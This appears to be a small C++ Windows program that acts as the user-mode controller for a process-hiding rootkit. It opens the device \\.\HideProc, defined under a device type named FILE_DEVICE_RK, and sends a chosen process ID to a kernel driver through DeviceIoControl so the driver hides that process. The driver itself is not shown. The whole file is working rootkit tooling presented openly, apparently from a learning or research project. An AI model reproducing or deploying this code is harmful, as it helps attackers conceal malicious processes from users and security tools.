#include <iostream>
#include <Windows.h>
using namespace std;

#define FILE_DEVICE_RK 0x00008001
#define IOCTL_TEST_CMD CTL_CODE(FILE_DEVICE_RK, 0x801, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)

int main(int argc, char* argv[]) {
	if (argc != 2) {
		cout << "[-] Usage: " << argv[0] << " <PID>\n";
		exit(EXIT_FAILURE);
	}

	HANDLE hFile;
	DWORD ProcessId, write;

	ProcessId = atoi(argv[1]);

	hFile = CreateFile("\\\\.\\HideProc", GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		cout << "[-] CreateFileFailed.\n";
		exit(EXIT_FAILURE);
	}

	cout << "[+] Opened handle to device with value " << hex << hFile << endl;

	

	DeviceIoControl(hFile, IOCTL_TEST_CMD, &ProcessId, sizeof(DWORD), NULL, 0, &write, NULL);

	CloseHandle(hFile);

	return 0;
}